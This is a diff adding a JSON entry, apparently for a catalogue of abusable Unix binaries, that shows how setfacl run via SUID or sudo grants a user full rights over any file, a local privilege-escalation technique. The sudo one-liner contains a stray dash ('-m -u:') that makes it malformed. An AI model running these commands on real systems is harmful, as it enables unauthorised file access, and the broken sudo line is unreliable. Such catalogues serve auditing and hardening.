@@ -1,0 +1,15 @@
+{
+  "description": "This can be run with elevated privileges to change ownership and then read, write, or execute a file.",
+  "functions": {
+    "suid": [
+      {
+        "code": "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
+      }
+    ]
+  }
+}
